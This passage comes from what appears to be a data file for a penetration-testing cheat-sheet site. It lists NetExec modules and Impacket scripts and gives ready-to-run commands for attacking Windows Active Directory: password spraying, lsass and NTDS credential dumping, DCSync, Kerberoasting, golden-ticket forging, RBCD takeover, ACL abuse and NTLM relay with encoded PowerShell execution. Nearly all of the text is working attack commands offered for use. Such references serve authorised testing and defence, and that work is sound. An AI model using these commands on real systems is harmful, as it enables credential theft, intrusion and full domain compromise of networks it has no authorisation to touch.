                "Extracting Credentials From Windows Logs (Event ID: 4688 and SYSMON)"
              ],
              [
                "-M exec_on_link",
                "mssql",
                "Execute commands on a SQL Server linked server"
              ],
              [
                "-M find-computer",
                "ldap",
                "Finds computers in the domain via the provided text"
              ],
              [
                "-M get-desc-users",
                "ldap",
                "Get description of the users. May contain password"
              ],
              [
                "-M get-info-users",
                "ldap",
                "Get the info field of all users. May contain password"
              ],
              [
                "-M get-network",
                "ldap",
                "Query all DNS records with the corresponding IP from the domain."
              ],
              [
                "-M get-scriptpath",
                "ldap",
                "Get the scriptPath attribute of all users."
              ],
              [
                "-M get-unixUserPassword",
                "ldap",
                "Get unixUserPassword attribute from all users in ldap"
              ],
              [
                "-M get-userPassword",
                "ldap",
                "Get userPassword attribute from all users in ldap"
              ],
              [
                "-M get_netconnections",
                "smb, wmi",
                "Uses WMI to query network connections."
              ],
              [
                "-M gpp_autologin",
                "smb",
                "Searches the domain controller for registry.xml to find autologon information and returns the username and password."
              ],
              [
                "-M gpp_password",
                "smb",
                "Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences."
              ],
              [
                "-M gpp_privileges",
                "smb",
                "Extracts privileges assigned via GPOs and resolves SIDs via LDAP."
              ],
              [
                "-M groupmembership",
                "ldap",
                "Query the groups to which a user belongs."
              ],
              [
                "-M handlekatz",
                "smb",
                "Get lsass dump using handlekatz64 and parse the result with pypykatz"
              ],
              [
                "-M hash_spider",
                "smb",
                "Dump lsass recursively from a given hash using BH to find local admins"
              ],
              [
                "-M hyperv-host",
                "smb",
                "Performs a registry query on the VM to lookup its HyperV Host"
              ],
              [
                "-M iis",
                "smb",
                "Checks for credentials in IIS Application Pool configuration files using appcmd.exe"
              ],
              [
                "-M impersonate",
                "smb",
                "List and impersonate tokens to run command as locally logged on users"
              ],
              [
                "-M install_elevated",
                "smb",
                "Checks for AlwaysInstallElevated"
              ],
              [
                "-M ioxidresolver",
                "smb, wmi",
                "This module helps you to identify hosts that have additional active interfaces"
              ],
              [
                "-M keepass_discover",
                "smb",
                "Search for KeePass-related files and process."
              ],
              [
                "-M keepass_trigger",
                "smb",
                "Set up a malicious KeePass trigger to export the database in cleartext."
              ],
              [
                "-M laps",
                "ldap",
                "Retrieves all LAPS passwords which the account has read permissions for."
              ],
              [
                "-M link_enable_cmdshell",
                "mssql",
                "Enable or disable xp_cmdshell on a linked MSSQL server"
              ],
              [
                "-M link_xpcmd",
                "mssql",
                "Run xp_cmdshell commands on a linked SQL server"
              ],
              [
                "-M lockscreendoors",
                "smb",
                "Detect Windows lock screen backdoors by checking FileDescriptions of accessibility binaries."
              ],
              [
                "-M lsassy",
                "smb",
                "Dump lsass and parse the result remotely with lsassy"
              ],
              [
                "-M maq",
                "ldap",
                "Retrieves the MachineAccountQuota domain-level attribute and check SeMachineAccountPrivilege (GPO/SYSVOL)"
              ],
              [
                "-M masky",
                "smb",
                "Remotely dump domain user credentials via an ADCS and a KDC"
              ],
              [
                "-M met_inject",
                "smb, mssql",
                "Downloads the Meterpreter stager and injects it into memory"
              ],
              [
                "-M mobaxterm",
                "smb, wmi, winrm, mssql",
                "Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export"
              ],
              [
                "-M modify-group",
                "smb, ldap",
                "Modify the group membership of users and computers"
              ],
              [
                "-M mremoteng",
                "smb, wmi, winrm, mssql",
                "Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them)"
              ],
              [
                "-M ms17-010",
                "smb",
                "MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB ENVIRONMENT"
              ],
              [
                "-M msol",
                "smb",
                "Dump MSOL cleartext password and Entra ID credentials from the localDB on the Entra ID Connect Server"
              ],
              [
                "-M mssql_cbt",
                "mssql",
                "Checks whether Channel Binding is enabled on the MSSQL database"
              ],
              [
                "-M mssql_coerce",
                "mssql",
                "Execute SQL commands To interact with a specified LISTENER for coercion/exfiltration"
              ],
              [
                "-M mssql_dumper",
                "mssql",
                "Search for Sensitive Data across all databases"
              ],
              [
                "-M mssql_priv",
                "mssql",
                "Enumerate and exploit MSSQL privileges"
              ],
              [
                "-M nanodump",
                "smb, mssql",
                "Get lsass dump using nanodump and parse the result with pypykatz"
              ],
              [
                "-M nopac",
                "smb",
                "Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user"
              ],
              [
                "-M notepad",
                "smb",
                "Extracts content from Windows Notepad tab state binary files."
              ],
              [
                "-M notepad++",
                "smb",
                "Extracts notepad++ unsaved files."
              ],
              [
                "-M ntds-dump-raw",
                "smb, wmi, winrm",
                "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive."
              ],
              [
                "-M ntdsutil",
                "smb",
                "Dump NTDS with ntdsutil"
              ],
              [
                "-M ntlmv1",
                "smb",
                "Detect if lmcompatibilitylevel on the target is set to lower than 3 (which means ntlmv1 is enabled)"
              ],
              [
                "-M obsolete",
                "ldap",
                "Extract all obsolete operating systems from LDAP"
              ],
              [
                "-M onelogon",
                "smb",
                "Scan GPOs and registry for machine accounts vulnerable to Onelogon"
              ],
              [
                "-M pi",
                "smb",
                "Run command as logged on users via Process Injection"
              ],
              [
                "-M powershell_history",
                "smb",
                "Extracts PowerShell history for all users and looks for sensitive commands."
              ],
              [
                "-M pre2k",
                "ldap",
                "Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each"
              ],
              [
                "-M presence",
                "smb",
                "Traces Domain and Enterprise Admin presence in the target over SMB"
              ],
              [
                "-M printnightmare",
                "smb",
                "Check if host vulnerable to printnightmare"
              ],
              [
                "-M procdump",
                "smb",
                "Get lsass dump using procdump64 and parse the result with pypykatz"
              ],
              [
                "-M putty",
                "smb",
                "Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found."
              ],
              [
                "-M raisechild",
                "ldap",
                "Compromise parent domain from child domain via trust abuse"
              ],
              [
                "-M rclone",
                "smb",
                "Searches for rclone.conf and deobscures credentials"
              ],
              [
                "-M rdcman",
                "smb, wmi, winrm, mssql",
                "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
              ],
              [
                "-M rdp",
                "smb, wmi",
                "Enables/Disables RDP"
              ],
              [
                "-M recent_files",
                "smb",
                "Extracts recently modified files"
              ],
              [
                "-M recyclebin",
                "smb",
                "Lists and exports users' recycle bins"
              ],
              [
                "-M reg-query",
                "smb",
                "Performs a registry query on the machine"
              ],
              [
                "-M reg-winlogon",
                "smb",
                "Collect autologon credential stored in the registry"
              ],
              [
                "-M remote-uac",
                "smb",
                "Enable or disable remote UAC"
              ],
              [
                "-M remove-mic",
                "smb",
                "Check if host vulnerable to CVE-2019-1040"
              ],
              [
                "-M resetnightmare",
                "ldap",
                "Exploit ResetNightmare (CVE-2026-27912) to reset any account's password via Kerberos change password"
              ],
              [
                "-M runasppl",
                "smb",
                "Check if the registry value RunAsPPL is set or not"
              ],
              [
                "-M sccm",
                "ldap",
                "Find a SCCM infrastructure in the Active Directory"
              ],
              [
                "-M sccm-recon6",
                "smb",
                "Check if target is a Distribution point or Primary Site Server through winreg (RECON-6)"
              ],
              [
                "-M schtask_as",
                "smb",
                "Remotely execute a scheduled task as a logged on user"
              ],
              [
                "-M scuffy",
                "smb",
                "Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares"
              ],
              [
                "-M security-questions",
                "smb",
                "Gets security questions and answers for users on computer"
              ],
              [
                "-M shadow-creds",
                "ldap",
                "List, add, inspect, remove, clear, backup, or revert Shadow Credentials on a user or computer"
              ],
              [
                "-M shadowrdp",
                "smb",
                "Enables or disables shadow RDP"
              ],
              [
                "-M slinky",
                "smb",
                "Creates windows shortcuts with the icon attribute containing a URI to the specified server (default SMB) in all shares with write permissions"
              ],
              [
                "-M smbghost",
                "smb",
                "Module to check for the SMB dialect 3.1.1 and compression capability of the host, which is an indicator for the SMBGhost vulnerability (CVE-2020-0796)."
              ],
              [
                "-M snipped",
                "smb",
                "Downloads screenshots taken by the (new) Snipping Tool."
              ],
              [
                "-M spider_plus",
                "smb",
                "List files recursively and save a JSON share-file metadata to the 'OUTPUT_FOLDER'. See module options for finer configuration."
              ],
              [
                "-M spooler",
                "smb, wmi",
                "Detect if print spooler is enabled or not"
              ],
              [
                "-M subnets",
                "ldap",
                "Retrieves the different Sites and Subnets of an Active Directory"
              ],
              [
                "-M teams_localdb",
                "smb",
                "Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process"
              ],
              [
                "-M test_connection",
                "smb, mssql",
                "Pings a host"
              ],
              [
                "-M timeroast",
                "smb",
                "Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account"
              ],
              [
                "-M tombstone",
                "ldap",
                "Query, restore and delete AD objects"
              ],
              [
                "-M uac",
                "smb",
                "Checks UAC status"
              ],
              [
                "-M user-desc",
                "ldap",
                "Get user descriptions stored in Active Directory"
              ],
              [
                "-M veeam",
                "smb",
                "Extracts credentials from local Veeam SQL Database"
              ],
              [
                "-M vnc",
                "smb, wmi, winrm",
                "Loot Passwords from VNC server and client configurations"
              ],
              [
                "-M wam",
                "smb, wmi, winrm, mssql",
                "Dump access token from Token Broker Cache. More info here https://blog.xpnsec.com/wam-bam/. Module by zblurx"
              ],
              [
                "-M wcc",
                "smb",
                "Check various security configuration items on Windows machines"
              ],
              [
                "-M wdigest",
                "smb",
                "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1"
              ],
              [
                "-M web_delivery",
                "smb, mssql",
                "Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module"
              ],
              [
                "-M webdav",
                "smb",
                "Checks whether the WebClient service is running on the target"
              ],
              [
                "-M whoami",
                "ldap",
                "Get details of provided user"
              ],
              [
                "-M wifi",
                "smb, wmi, winrm, mssql",
                "Get key of all wireless interfaces"
              ],
              [
                "-M winscp",
                "smb",
                "Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials."
              ],
              [
                "-M zerologon",
                "smb, wmi",
                "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
              ]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Initial credential validation", cmd: "nxc smb 10.10.10.0/24 -u user -p pass" },
              { label: "Enumerate once creds are confirmed", cmd: "nxc smb <target> -u user -p pass --shares\nnxc smb <target> -u user -p pass --sam\nnxc ldap <dc> -u user -p pass --users" },
              { label: "Spray, then validate the hit", cmd: "nxc smb 10.10.10.0/24 -u users.txt -p 'Season2026!' --continue-on-success\nnxc smb 10.10.10.0/24 -u <found_user> -p 'Season2026!' --shares" },
              { label: "BloodHound collection into analysis", cmd: "nxc ldap <dc> -u user -p pass -d domain.local --bloodhound -c All\n# import the resulting .zip into BloodHound CE, then run path-to-DA queries" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always check --pass-pol before spraying — one wrong guess per account is fine, several isn't if the lockout threshold is low.",
              "--continue-on-success is easy to forget and will make a spray stop dead at the first valid hit — add it by default.",
              "Build the spray list from data you already have: jq the samaccountname out of a BloodHound *_users.json, or use --users / --rid-brute; filter disabled accounts so you don't burn guesses.",
              "Timeroasting (-M timeroast) needs no credentials — it abuses MS-SNTP on the DC and returns computer/trust-account hashes that crack with hashcat -m 31300, worthwhile mainly against weakly-set machine or trust passwords.",
              "List the modules for a protocol with nxc <protocol> -L; run one with -M <name>, and see its settings with nxc <protocol> -M <name> --options (pass options as -o KEY=value).",
              "NetExec is the maintained fork of CrackMapExec (cme) — same mental model, a handful of renamed flags.",
              "Combine LDAP enumeration output directly into BloodHound rather than reading it as a flat list — attack-path context is the whole point.",
              "Prefer --no-bruteforce with paired username:password files so you're not accidentally testing every combination against a locked-out-prone environment."
            ]
          }
        ]
      },
      {
        "id": "impacket-suite",
        "name": "Impacket Suite",
        "url": "https://github.com/fortra/impacket",
        "description": "Python classes + ~70 example scripts for attacking Windows/AD protocols — secrets, tickets, shells, relay.",
        "brief": "Impacket is a collection of Python classes for working directly with Windows network protocols (SMB, MSRPC, DCOM, LDAP, Kerberos, MS-TDS, NTLM), plus ~70 ready-to-run example scripts in examples/. On an AD engagement it is the workhorse reached for the moment valid credentials are confirmed — for dumping secrets, roasting and forging Kerberos tickets, getting a shell, editing AD objects, and relaying NTLM.\n\nAlmost every script shares the same target string and authentication model (below), so once you know how to point one at a host and pass a password, hash, AES key or ticket, you know them all. Distro packages expose each script prefixed, e.g. impacket-secretsdump, impacket-wmiexec.",
        "quickReference": [
          {
            "label": "Dump SAM/LSA/NTDS",
            "cmd": "secretsdump.py domain/user:pass@target"
          },
          {
            "label": "Shell over WMI (quiet)",
            "cmd": "wmiexec.py domain/user:pass@target"
          },
          {
            "label": "Kerberoast",
            "cmd": "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request"
          },
          {
            "label": "AS-REP roast",
            "cmd": "GetNPUsers.py domain/ -usersfile users.txt -dc-ip <dc>"
          },
          {
            "label": "NTLM relay to LDAPS",
            "cmd": "ntlmrelayx.py -t ldaps://<dc> --escalate-user <you>"
          }
        ],
        "sections": [
          {
            "title": "Universal connection & authentication flags (apply to almost every script)",
            "type": "table",
            "columns": [
              "Flag / token",
              "Meaning"
            ],
            "rows": [
              [
                "domain/user:password@target",
                "Standard target string. Omit :password to be prompted; omit @target for LDAP/DC-only tools"
              ],
              [
                "-hashes LMHASH:NTHASH",
                "Pass-the-hash. Use an empty LM half, e.g. -hashes :<nthash>"
              ],
              [
                "-k",
                "Use Kerberos auth from the ccache in $KRB5CCNAME (pass-the-ticket)"
              ],
              [
                "-no-pass",
                "Don't prompt for a password (pair with -k, -hashes or -aesKey)"
              ],
              [
                "-aesKey <hex>",
                "Kerberos with an AES128/256 key (pass-the-key / overpass-the-hash)"
              ],
              [
                "-dc-ip <ip>",
                "IP of the domain controller / KDC to talk to"
              ],
              [
                "-dc-host <fqdn>",
                "DC hostname — needed for the Kerberos SPN when it differs from -dc-ip"
              ],
              [
                "-target-ip <ip>",
                "Where to actually connect when the target name is not routable"
              ],
              [
                "-port <n>",
                "Non-default service port"
              ],
              [
                "-ldaps",
                "Use LDAPS (636/TLS) instead of LDAP on the LDAP-based tools"
              ],
              [
                "-ts / -debug",
                "Prefix every log line with a timestamp / enable verbose debug"
              ]
            ]
          },
          {
            "title": "Credential dumping & secrets",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "secretsdump.py",
                "Dump SAM, cached creds, LSA secrets and (on a DC) NTDS.dit",
                "-just-dc, -just-dc-ntlm, -just-dc-user <u>, -use-vss, -sam/-system/-security/-ntds (offline), -exec-method, -history, -outputfile"
              ],
              [
                "regsecrets.py",
                "secretsdump alternative that reads secrets via the remote registry (different footprint)",
                "same model as secretsdump; -exec-method"
              ],
              [
                "dpapidump.py",
                "Automate extraction of the SYSTEM user's DPAPI credentials on a remote host",
                "standard auth (-hashes/-k)"
              ],
              [
                "Get-GPPPassword.py",
                "Extract & decrypt Group Policy Preferences cpasswords from SYSVOL (or a local XML)",
                "-xmlfile <Groups.xml> LOCAL  |  domain/user:pass@dc, -share, -base-dir"
              ],
              [
                "GetLAPSPassword.py",
                "Read LAPS / LAPSv2 local-admin passwords from the directory",
                "-computer <name>, -outputfile, -ldaps"
              ],
              [
                "keylistattack.py",
                "KERB-KEY-LIST-REQ attack to dump key material (RODC / read-only KDC)",
                "-rodcNo <id>, -rodcKey <key>, -full, -t/-tf, -domain-sid"
              ],
              [
                "dpapi.py",
                "Offline/remote DPAPI & Vault toolkit — decrypt masterkeys, credentials, vaults, blobs",
                "subcommands masterkey/credential/vault/backupkeys; -file, -key, -sid, -pvk, -masterkey"
              ],
              [
                "getPac.py",
                "Fetch the PAC of a target user with only normal authenticated creds",
                "-targetUser <user>"
              ]
            ]
          },
          {
            "title": "secretsdump.py — workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Remote: SAM + LSA + cached logons",
                "cmd": "secretsdump.py domain/user:pass@target\n# add -hashes :<nthash> to pass-the-hash, or -k -no-pass for Kerberos"
              },
              {
                "label": "Domain hashes from a DC (quieter NTLM-only)",
                "cmd": "secretsdump.py domain/user:pass@dc -just-dc-ntlm\n# -just-dc also pulls Kerberos keys + password history; -just-dc-user krbtgt for one account"
              },
              {
                "label": "Targeted DCSync of one account",
                "cmd": "secretsdump.py -just-dc-user Administrator domain/user:pass@dc"
              },
              {
                "label": "Offline from exported hives / NTDS",
                "cmd": "secretsdump.py -sam SAM -system SYSTEM LOCAL\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
              },
              {
                "label": "Use VSS instead of DRSUAPI on the DC",
                "cmd": "secretsdump.py domain/user:pass@dc -use-vss"
              }
            ]
          },
          {
            "title": "Remote code execution",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "psexec.py",
                "SYSTEM shell by dropping & running a service binary (RemComSvc)",
                "-c <localbin>, -path, -service-name, -remote-binary-name, -codec"
              ],
              [
                "smbexec.py",
                "Semi-interactive exec via a service, no binary dropped",
                "-mode SERVER|SHARE, -share, -shell-type cmd|powershell, -service-name"
              ],
              [
                "wmiexec.py",
                "Semi-fileless exec over WMI (DCOM) — no service created",
                "-share, -nooutput, -silentcommand, -shell-type, -com-version"
              ],
              [
                "atexec.py",
                "One-shot command via the Task Scheduler (ATSVC)",
                "-session-id <id>, -silentcommand (positional: target command)"
              ],
              [
                "dcomexec.py",
                "Exec through DCOM objects (MMC20 / ShellWindows / ShellBrowserWindow)",
                "-object MMC20|ShellWindows|ShellBrowserWindow, -nooutput, -silentcommand"
              ],
              [
                "sambaPipe.py",
                "Exploit SambaCry (CVE-2017-7494) — load a shared library on a Samba host",
                "standard auth; path to the .so"
              ]
            ]
          },
          {
            "title": "Remote execution — workflows",
            "type": "commands",
            "commands": [
              {
                "label": "wmiexec with pass-the-hash (quiet default)",
                "cmd": "wmiexec.py domain/user@target -hashes :<nthash>\nwmiexec.py domain/user:pass@target -silentcommand \"whoami /all\""
              },
              {
                "label": "psexec for a full SYSTEM shell",
                "cmd": "psexec.py domain/user:pass@target\npsexec.py -k -no-pass domain/user@target        # via Kerberos ccache"
              },
              {
                "label": "smbexec with a PowerShell shell",
                "cmd": "smbexec.py domain/user:pass@target -shell-type powershell"
              },
              {
                "label": "atexec / dcomexec one-shot",
                "cmd": "atexec.py domain/user:pass@target \"ipconfig /all\"\ndcomexec.py -object MMC20 domain/user:pass@target \"whoami\""
              }
            ]
          },
          {
            "title": "Kerberos — roasting, tickets & forging",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "GetUserSPNs.py",
                "Kerberoast — find SPN-bearing accounts and request their TGS",
                "-request, -request-user <u>, -usersfile, -no-preauth <u> (targeted, no creds), -stealth, -outputfile, -dc-host"
              ],
              [
                "GetNPUsers.py",
                "AS-REP roast — users with Kerberos pre-auth disabled",
                "-request, -usersfile, -format hashcat|john, -no-pass, -outputfile"
              ],
              [
                "getTGT.py",
                "Request a TGT from a password, hash, AES key or certificate (PKINIT)",
                "-hashes, -aesKey, -cert-pfx <f> -pfx-pass, -cert-pem/-key-pem, -principalType"
              ],
              [
                "getST.py",
                "Request a service ticket — S4U delegation, U2U, dMSA (BadSuccessor)",
                "-spn <spn>, -impersonate <user>, -self, -altservice <svc>, -u2u, -additional-ticket, -dmsa <dMSA$>, -force-forwardable"
              ],
              [
                "ticketer.py",
                "Forge golden / silver tickets (or from a legally-requested template)",
                "-nthash|-aesKey, -domain-sid, -spn (silver), -groups, -user-id, -extra-sid, -impersonate, -request"
              ],
              [
                "ticketConverter.py",
                "Convert between .kirbi (Mimikatz) and .ccache (Impacket)",
                "positional: input output (direction auto-detected)"
              ],
              [
                "describeTicket.py",
                "Parse a ticket, decrypt enc-part, and dump the PAC",
                "positional: ticket; -p <pass>, --rc4/--aes/--asrep-key <key>"
              ],
              [
                "goldenPac.py",
                "MS14-068 — forge a PAC to become Domain Admin on an unpatched DC",
                "domain/user:pass@target-fqdn (+ command)"
              ],
              [
                "raiseChild.py",
                "Child-domain → forest-root privilege escalation (automated)",
                "-target-exec <forest-dc>, -targetRID, -w <ccache>"
              ]
            ]
          },
          {
            "title": "Kerberos — workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Kerberoast (all, then one user)",
                "cmd": "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request\nGetUserSPNs.py domain/user:pass -dc-ip <dc> -request-user svc_sql -outputfile roast.txt"
              },
              {
                "label": "Targeted roast with no creds (-no-preauth)",
                "cmd": "GetUserSPNs.py -no-preauth <nopreauth_user> -usersfile targets.txt -dc-host dc.domain.local domain/"
              },
              {
                "label": "AS-REP roast",
                "cmd": "GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <dc>"
              },
              {
                "label": "TGT from a hash / an AES key / a certificate",
                "cmd": "getTGT.py domain/user -hashes :<nthash>\ngetTGT.py domain/user -aesKey <hex>\ngetTGT.py domain/user -cert-pfx user.pfx -pfx-pass ''      # PKINIT (ESC1 / shadow creds)"
              },
              {
                "label": "S4U — impersonate a user to a service (constrained deleg)",
                "cmd": "export KRB5CCNAME=svc.ccache\ngetST.py -spn cifs/target.domain.local -impersonate Administrator domain/svc$ -no-pass -k"
              },
              {
                "label": "BadSuccessor — dMSA ticket (Server 2025)",
                "cmd": "getST.py -dmsa <dmsa$> -impersonate Administrator -spn cifs/dc.domain.local domain/user:pass"
              },
              {
                "label": "Golden / silver ticket, then convert",
                "cmd": "ticketer.py -nthash <krbtgt_nt> -domain-sid <S-1-5-21-...> -domain domain.local Administrator\nticketConverter.py ticket.kirbi ticket.ccache"
              }
            ]
          },
          {
            "title": "AD objects, ACLs & delegation",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "rbcd.py",
                "Read/write msDS-AllowedToActOnBehalfOfOtherIdentity (resource-based constrained delegation)",
                "-delegate-to 'TARGET$', -delegate-from 'ATTACKER$', -action read|write|remove|flush (positional: identity)"
              ],
              [
                "dacledit.py",
                "Read/modify an object DACL — grant yourself DCSync, reset-password, etc.",
                "-action read|write|remove|backup|restore, -principal <you>, -target <victim>, -rights FullControl|ResetPassword|WriteMembers|DCSync|Custom, -rights-guid, -inheritance"
              ],
              [
                "owneredit.py",
                "Read/modify an object Owner (the step before dacledit when you lack WriteDACL)",
                "-action read|write, -new-owner <you>, -target <victim>"
              ],
              [
                "addcomputer.py",
                "Add (or delete) a computer account via SAMR or LDAPS (MachineAccountQuota)",
                "-method SAMR|LDAPS, -computer-name 'EVIL$', -computer-pass <pw>, -delete, -no-add, -baseDN"
              ],
              [
                "findDelegation.py",
                "Enumerate unconstrained / constrained / RBCD delegation in the domain",
                "-user <u>, -disabled, -dc-ip"
              ],
              [
                "badsuccessor.py",
                "dMSA exploitation (BadSuccessor) — abuse a delegated MSA for escalation",
                "-action, -dmsa-name, -target-ou, -principals-allowed, -target-account, -method"
              ],
              [
                "net.py",
                "net.exe-style user/group/computer management over MSRPC",
                "subcommands user/group/computer/localgroup; -name, -create/-remove, -join/-unjoin, -newPasswd"
              ],
              [
                "changepasswd.py",
                "Change your own, or reset another account's, password (SAMR/kpasswd/LDAP)",
                "-newpass <new>, -altuser <admin> -altpass <pw> (reset as admin)"
              ],
              [
                "GetADUsers.py",
                "Enumerate domain users (and emails / last-logon) via LDAP",
                "-all, -user <u>, -ldaps"
              ],
              [
                "GetADComputers.py",
                "Enumerate domain computers via LDAP",
                "-all, -ldaps"
              ]
            ]
          },
          {
            "title": "ACLs & delegation — workflows",
            "type": "commands",
            "commands": [
              {
                "label": "RBCD takeover (write, then S4U)",
                "cmd": "addcomputer.py -method LDAPS -computer-name 'EVIL$' -computer-pass 'Pass123!' domain/user:pass\nrbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write -dc-ip <dc> domain/user:pass\ngetST.py -spn cifs/target.domain.local -impersonate Administrator domain/EVIL$:'Pass123!'"
              },
              {
                "label": "Grant yourself DCSync over the domain",
                "cmd": "dacledit.py -action write -rights DCSync -principal <you> -target-dn \"DC=domain,DC=local\" domain/user:pass -dc-ip <dc>"
              },
              {
                "label": "Take ownership, then write the DACL",
                "cmd": "owneredit.py -action write -new-owner <you> -target <victim> domain/user:pass\ndacledit.py -action write -rights FullControl -principal <you> -target <victim> domain/user:pass"
              },
              {
                "label": "Reset a user's password as an admin",
                "cmd": "changepasswd.py domain/victim@dc -newpass 'Newpass123!' -altuser domain/admin -altpass '<adminpass>'"
              }
            ]
          },
          {
            "title": "SMB, RPC & host enumeration",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "smbclient.py",
                "Interactive SMB client (browse shares, get/put files)",
                "-inputfile <cmds>, -outputfile, -dfs-follow"
              ],
              [
                "smbserver.py",
                "Stand up an SMB server (hash capture / payload staging / exfil)",
                "shareName sharePath, -smb2support, -username/-password, -ip, -port"
              ],
              [
                "lookupsid.py",
                "RID cycling via MS-LSAT — enumerate users/groups from a SID",
                "positional: target [maxRid], -domain-sids"
              ],
              [
                "samrdump.py",
                "SAMR enumeration of users, groups and aliases",
                "-csv"
              ],
              [
                "reg.py",
                "Remote registry: query/add/delete/save/backup/load",
                "subcommands; -keyName, -v, -s, -o <dir>"
              ],
              [
                "services.py",
                "Remote service control (MS-SCMR): list/start/stop/create/change/config/delete",
                "-name, -display, -path, -service_type, -start_type"
              ],
              [
                "rpcdump.py",
                "Dump the MSRPC endpoint mapper (EPM) — listening interfaces",
                "standard auth"
              ],
              [
                "rpcmap.py",
                "Scan an MSRPC string binding for listening interface UUIDs",
                "positional: stringbinding, -auth-*"
              ],
              [
                "netview.py",
                "Track logged-on users / open sessions across hosts",
                "-target <host>, -users, -targets"
              ],
              [
                "getArch.py",
                "Get a target's OS architecture over DCE/RPC (no creds)",
                "-target <host>"
              ],
              [
                "machine_role.py",
                "Retrieve a host's role (standalone/member/DC) via MS-DSSP",
                "standard auth"
              ],
              [
                "DumpNTLMInfo.py",
                "Dump host/NTLM info from SMB with no credentials (OS, domain, signing)",
                "(no auth needed)"
              ],
              [
                "CheckLDAPStatus.py",
                "Report LDAP signing and LDAPS channel-binding enforcement",
                "-ldaps"
              ],
              [
                "checkMSSQLStatus.py",
                "Report MSSQL signing/encryption posture",
                "standard auth"
              ],
              [
                "attrib.py / filetime.py",
                "Query/modify file attributes and timestamps (timestomp) over pure SMB",
                "standard auth"
              ],
              [
                "esentutl.py / ntfs-read.py / registry-read.py",
                "Dump an ESE DB, browse a raw NTFS volume, or read offline registry hives",
                "local file args"
              ],
              [
                "tstool.py",
                "Terminal Services (RDP session) query / disconnect / logoff / message",
                "standard auth"
              ]
            ]
          },
          {
            "title": "MSSQL",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "mssqlclient.py",
                "Interactive MS-TDS client — xp_cmdshell, linked servers, impersonation",
                "-windows-auth, -db <name>, -k, -command <q>, -file, -named-pipe"
              ],
              [
                "mssqlinstance.py",
                "Enumerate MSSQL instance names on a host (MC-SQLR / UDP 1434)",
                "positional: host"
              ],
              [
                "checkMSSQLStatus.py",
                "Check a server's signing / encryption configuration",
                "standard auth"
              ]
            ]
          },
          {
            "title": "mssqlclient.py — workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Connect (SQL / Windows / Kerberos auth)",
                "cmd": "mssqlclient.py domain/user:pass@sql -windows-auth\nmssqlclient.py -k sql.domain.local        # Kerberos from the ccache"
              },
              {
                "label": "Code execution via xp_cmdshell",
                "cmd": "# in the SQL shell:\nenable_xp_cmdshell\nxp_cmdshell whoami"
              },
              {
                "label": "Linked-server crawl & impersonation",
                "cmd": "enum_links\nuse_link <LINKED_SERVER>\nexec_as_login sa   /   exec_as_user dbo"
              }
            ]
          },
          {
            "title": "NTLM relay & MITM",
            "type": "table",
            "columns": [
              "Script",
              "Purpose",
              "Key flags"
            ],
            "rows": [
              [
                "ntlmrelayx.py",
                "Relay captured NTLM auth to SMB/LDAP(S)/HTTP/MSSQL/RPC and run an attack",
                "-t/-tf <target(s)>, -smb2support, -i (interactive), -socks, -c/-e, --remove-mic"
              ],
              [
                "ntlmrelayx.py (LDAP attacks)",
                "Act in the directory as the relayed victim",
                "--escalate-user <u>, --delegate-access, --add-computer, --shadow-credentials --shadow-target, --dump-laps, --dump-gmsa, --dump-adcs"
              ],
              [
                "ntlmrelayx.py (ADCS / ESC8 & ESC11)",
                "Relay to web-enrollment or the RPC CA to get a cert",
                "--adcs, --template <T>, -rpc-mode ICPR -icpr-ca-name <CA>"
              ],
              [
                "karmaSMB.py",
                "Serve attacker-chosen files in response to any SMB file request",
                "positional: answer file"
              ],
              [
                "rdp_check.py",
                "Validate credentials against RDP (CredSSP/NLA) without a full session",
                "standard auth"
              ],
              [
                "kintercept.py",
                "Kerberos relay / interception helper used when testing relay chains",
                "(helper)"
              ]
            ]
          },
          {
            "title": "ntlmrelayx.py — workflows",
            "type": "commands",
            "commands": [
              {
                "label": "Relay to LDAPS and escalate (RBCD / ACL)",
                "cmd": "ntlmrelayx.py -t ldaps://<dc> --escalate-user <you> --delegate-access\n# coerce auth into you (PetitPotam / PrinterBug / DFSCoerce) while this runs"
              },
              {
                "label": "Relay to SMB and run a command",
                "cmd": "ntlmrelayx.py -t smb://<host> -smb2support -c \"powershell -enc <b64>\"\nntlmrelayx.py -tf targets.txt -smb2support -i      # or drop to an interactive SMB client"
              },
              {
                "label": "Relay to AD CS web enrollment (ESC8)",
